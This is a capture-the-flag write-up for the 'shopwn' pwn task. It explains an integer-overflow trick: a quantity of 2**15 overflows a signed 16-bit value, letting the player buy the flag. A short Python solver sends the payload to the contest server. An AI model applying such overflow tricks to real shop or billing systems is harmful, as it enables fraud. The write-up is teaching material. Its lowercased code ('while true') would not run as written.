# shopwn (pwn, 375p, 76 solved)

a task very similar to shopping, but this time we can pass only positive numbers as quantity.
the interface is exactly the same so again:

```
welcome to ekoparty shopping center
feel free to buy up to 5 items that you may like
use wisely your coins, have fun!


you have 50 coins
what do you wanna buy today?
1. t-shirt		10
2. short		20
3. stickers		1
4. flag			?
```

this time the trick is to guess that since the server can check if our input is negative, it means there is a signed integer of some sort where our input is stored.
in such case there is a chance of causing integer overflow when this value is multiplied by the price.
we didn't know how many bits they're using but we got a hit with 16 bits.
so we send a large signed 16 bit integer, which has to overflow after multiplication.

we run:

```python
import hashlib
import re

import os

from crypto_commons.netcat.netcat_commons import nc, send, interactive


def pow(task):
    while true:
        data = os.urandom(10)
        if hashlib.sha1(data).hexdigest()[0:6] == task:
            return data


def main():
    url = "shopping.ctf.site"
    port = 22222
    s = nc(url, port)
    data = s.recv(9999)
    task = re.findall("== (.*)", data)[0]
    send(s, pow(task))
    print(s.recv(9999))
    send(s, "4")
    print(s.recv(9999))
    send(s, str(2 ** 15))
    print(s.recv(9999))
    interactive(s)


main()

```

and we get `eko{dude_where_is_my_leak?}`
